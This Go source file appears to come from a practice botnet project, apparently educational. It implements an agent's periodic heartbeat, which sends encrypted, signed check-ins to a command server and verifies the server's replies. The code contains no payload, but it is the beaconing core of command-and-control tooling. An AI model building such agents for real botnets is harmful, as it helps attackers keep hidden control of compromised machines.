package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"time"

	"github.com/abhi267266/botnet-practice/pkg/protocol"
	"github.com/abhi267266/botnet-practice/pkg/security"
)

// StartHeartbeat begins the periodic ping process from Agent to Server.
// It blocks until the context is canceled.
func StartHeartbeat(ctx context.Context, serverURL string, agentID string, intervalSec int, secret string, certFile string) {
	interval := time.Duration(intervalSec) * time.Second
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	// Configure TLS Client
	client := &http.Client{}
	if certFile != "" {
		certData, err := os.ReadFile(certFile)
		if err != nil {
			slog.Error("Failed to read server cert", "error", err)
		} else {
			pool := x509.NewCertPool()
			pool.AppendCertsFromPEM(certData)
			client.Transport = &http.Transport{
				TLSClientConfig: &tls.Config{RootCAs: pool},
			}
			slog.Info("Custom TLS trust pool configured", "cert_file", certFile)
		}
	}

	// Perform an initial heartbeat immediately
	sendHeartbeat(client, serverURL, agentID, secret)

	for {
		select {
		case <-ctx.Done():
			slog.Info("Heartbeat routine stopped")
			return
		case <-ticker.C:
			sendHeartbeat(client, serverURL, agentID, secret)
		}
	}
}

func sendHeartbeat(client *http.Client, serverURL string, agentID string, secret string) {
	reqData := protocol.HeartbeatRequest{
		AgentID: agentID,
	}

	payload, err := json.Marshal(reqData)
	if err != nil {
		slog.Error("Failed to marshal heartbeat request", "error", err)
		return
	}

	// Encrypt Payload
	ciphertext, nonce, err := security.Encrypt(payload, secret)
	if err != nil {
		slog.Error("Failed to encrypt heartbeat request", "error", err)
		return
	}

	ts := time.Now().Unix()
	sig := security.Sign(ciphertext, nonce, ts, secret)
	
	env := protocol.EncryptedEnvelope{
		Data:      ciphertext,
		Nonce:     nonce,
		Timestamp: ts,
		Signature: sig,
	}

	envBytes, _ := json.Marshal(env)

	url := fmt.Sprintf("%s/v1/heartbeat", serverURL)
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(envBytes))
	if err != nil {
		slog.Warn("Failed to send heartbeat", "error", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		slog.Warn("Heartbeat rejected by server", "status", resp.Status)
		return
	}

	// Parse and verify response
	var respEnv protocol.EncryptedEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&respEnv); err != nil {
		slog.Warn("Failed to decode server response", "error", err)
		return
	}

	if err := security.ValidateTimestamp(respEnv.Timestamp, 30*time.Second); err != nil {
		slog.Warn("Server response timestamp invalid", "error", err)
		return
	}

	if err := security.VerifySignature(respEnv.Data, respEnv.Nonce, respEnv.Timestamp, respEnv.Signature, secret); err != nil {
		slog.Warn("Server response signature invalid", "error", err)
		return
	}

	slog.Debug("Heartbeat successful")
}
